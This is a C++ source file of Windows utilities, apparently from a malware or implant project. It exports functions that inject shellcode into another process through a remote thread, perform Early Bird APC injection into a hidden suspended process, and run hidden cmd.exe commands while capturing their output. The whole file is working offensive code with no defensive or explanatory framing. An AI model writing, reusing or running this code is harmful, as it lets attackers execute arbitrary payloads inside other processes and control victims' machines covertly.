// utils.cpp - Process Injection, Early Bird APC, Memory Operations & Command Execution
#include <windows.h>
#include <tlhelp32.h>
#include <psapi.h>
#include <stdio.h>
#include <vector>

#pragma comment(lib, "psapi.lib")

extern "C" {

// ---------- REMOTE THREAD INJECTION ----------
BOOL InjectShellcodeRemote(DWORD pid, const unsigned char* shellcode, DWORD shellcodeLen) {
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (!hProcess) return FALSE;
    
    LPVOID remoteAddr = VirtualAllocEx(hProcess, NULL, shellcodeLen, 
                                       MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!remoteAddr) {
        CloseHandle(hProcess);
        return FALSE;
    }
    
    SIZE_T written = 0;
    if (!WriteProcessMemory(hProcess, remoteAddr, shellcode, shellcodeLen, &written) || written != shellcodeLen) {
        VirtualFreeEx(hProcess, remoteAddr, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return FALSE;
    }
    
    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, 
                                        (LPTHREAD_START_ROUTINE)remoteAddr, 
                                        NULL, 0, NULL);
    if (!hThread) {
        VirtualFreeEx(hProcess, remoteAddr, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return FALSE;
    }
    
    WaitForSingleObject(hThread, 5000);
    CloseHandle(hThread);
    CloseHandle(hProcess);
    return TRUE;
}

// ---------- EARLY BIRD APC INJECTION (Suspended Process Injection) ----------
BOOL EarlyBirdInject(LPCSTR targetExe, const unsigned char* shellcode, DWORD shellcodeLen) {
    STARTUPINFOA si = { 0 };
    PROCESS_INFORMATION pi = { 0 };
    si.cb = sizeof(STARTUPINFOA);
    si.dwFlags |= STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    
    if (!CreateProcessA(targetExe, NULL, NULL, NULL, FALSE, 
                        CREATE_SUSPENDED | CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        return FALSE;
    }
    
    LPVOID remoteMem = VirtualAllocEx(pi.hProcess, NULL, shellcodeLen, 
                                      MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!remoteMem) {
        TerminateProcess(pi.hProcess, 0);
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        return FALSE;
    }
    
    SIZE_T written = 0;
    if (!WriteProcessMemory(pi.hProcess, remoteMem, shellcode, shellcodeLen, &written)) {
        VirtualFreeEx(pi.hProcess, remoteMem, 0, MEM_RELEASE);
        TerminateProcess(pi.hProcess, 0);
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        return FALSE;
    }
    
    // Queue APC to main thread before process initialization
    QueueUserAPC((PAPCFUNC)remoteMem, pi.hThread, 0);
    
    // Resume thread -> triggers APC before entry point
    ResumeThread(pi.hThread);
    
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    return TRUE;
}

// ---------- ANONYMOUS PIPE COMMAND RUNNER ----------
void ExecuteCommand(const char* cmd, char* output, int* outLen) {
    SECURITY_ATTRIBUTES sa = { sizeof(SECURITY_ATTRIBUTES), NULL, TRUE };
    HANDLE hReadPipe = NULL, hWritePipe = NULL;
    
    if (!CreatePipe(&hReadPipe, &hWritePipe, &sa, 0)) return;
    SetHandleInformation(hReadPipe, HANDLE_FLAG_INHERIT, 0);
    
    PROCESS_INFORMATION pi = { 0 };
    STARTUPINFOA si = { 0 };
    si.cb = sizeof(STARTUPINFOA);
    si.hStdOutput = hWritePipe;
    si.hStdError = hWritePipe;
    si.dwFlags |= STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    
    char cmdLine[2048];
    snprintf(cmdLine, sizeof(cmdLine), "cmd.exe /c %s", cmd);
    
    if (CreateProcessA(NULL, cmdLine, NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        CloseHandle(hWritePipe);
        hWritePipe = NULL;
        
        WaitForSingleObject(pi.hProcess, 15000);
        
        DWORD bytesRead = 0;
        char buffer[8192] = { 0 };
        DWORD total = 0;
        
        while (ReadFile(hReadPipe, buffer + total, sizeof(buffer) - total - 1, &bytesRead, NULL) && bytesRead > 0) {
            total += bytesRead;
            if (total >= sizeof(buffer) - 1) break;
        }
        buffer[total] = 0;
        
        if (output && outLen) {
            int copyLen = (total < (DWORD)(*outLen - 1)) ? total : (*outLen - 1);
            memcpy(output, buffer, copyLen);
            output[copyLen] = 0;
            *outLen = copyLen;
        }
        
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    }
    
    if (hWritePipe) CloseHandle(hWritePipe);
    if (hReadPipe) CloseHandle(hReadPipe);
}

}
